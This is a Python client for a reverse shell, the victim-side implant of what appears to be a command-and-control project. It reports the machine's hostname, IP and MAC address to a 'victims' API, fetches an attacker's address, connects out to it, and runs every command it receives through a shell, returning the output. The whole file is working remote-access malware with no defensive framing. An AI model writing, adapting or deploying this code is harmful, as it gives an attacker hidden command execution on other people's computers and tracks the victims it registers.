import subprocess
import requests
import socket
import json
import uuid
import sys
import re
import os


class Client(object):

    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host_name = socket.gethostname()
        self.host_ip = socket.gethostbyname(self.host_name)
        self.port = ''
        self.mac_address = self.get_mac_address()
        # Change directory to 'Desktop'.
        # os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop")) #TODO Fix this.

    @staticmethod
    def get_mac_address():
        # joins elements of getnode() after each 2 digits.
        # using regex expression
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

    def create_victim(self):
        data = {
            'ip': self.host_ip,
            'port': self.port,
            'computer_name': self.host_name,
            'mac_address': self.mac_address,
            'logged_in': True,
        }
        response = requests.post('http://127.0.0.1:8000/reverse_shell/api/victims/', data=data)
        return response

    def update_victim(self, data):
        response = requests.patch(f'http://127.0.0.1:8000/reverse_shell/api/victims/{self.mac_address}/', data=data)
        return response

    def connect_to_attacker(self):
        response = requests.get(
            f'http://127.0.0.1:8000/reverse_shell/api/attackers/get_attacker/?mac_address={self.mac_address}')
        while response.status_code != 200:
            response = requests.get(
                f'http://127.0.0.1:8000/reverse_shell/api/attackers/get_attacker/?mac_address={self.mac_address}')
        attacker = json.loads(response.text)
        attacker_ip = attacker['ip']
        attacker_port = attacker['port']
        self.client.connect((attacker_ip, attacker_port))
        self.update_victim(data={'port': self.client.getsockname()[1]})

    def connect_to_web_server(self):
        response = self.create_victim()
        if response.status_code == 400:
            self.update_victim(data={'logged_in': True})
        self.connect_to_attacker()

    def main(self):
        self.connect_to_web_server()
        while True:
            try:
                data = self.client.recv(1024).decode('utf-8')
                if data == 'quit':
                    print("quitting...")
                    self.update_victim(data={'logged_in': False})
                    self.client.close()
                    sys.exit()
                if data[:2] == 'cd':
                    os.chdir(data[3:])
                if len(data) > 0:
                    command = subprocess.Popen(
                        data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                    )
                    output_bytes = command.stdout.read()
                    output_str = str(output_bytes, "utf-8")
                    self.client.send(str.encode(str(os.getcwd()) + '$ ' + output_str))
            except:  # catch *all* exceptions
                self.client.close()
                self.update_victim(data={'logged_in': False})
                raise


if __name__ == '__main__':
    client = Client()
    client.main()
